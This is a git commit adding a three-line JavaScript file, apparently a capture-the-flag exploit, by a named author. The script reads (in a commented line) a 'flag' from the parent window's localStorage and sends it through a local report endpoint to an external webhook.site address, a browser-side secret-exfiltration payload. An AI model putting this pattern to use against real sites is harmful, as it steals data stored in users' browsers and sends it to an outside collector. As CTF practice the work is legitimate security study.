3557731cb627016567c59b89a2aa00cb60786fbb
Thanasis Trispiotis <thanasistrisp@gmail.com>
2025-10-29 13:03:54 +0100

    Add flag variable and reporting functionality

---
+++ test6.js
@@ -0,0 +1,3 @@
+// var flag = window.parent.localStorage.getItem('flag');
+var flag = 'here_is_the_flag';
+window.parent.fetch('http://127.0.0.1:9007/report?url=https://webhook.site/03da09f8-364b-436d-ba9b-7dfa1d42d79f/?data=' + flag);
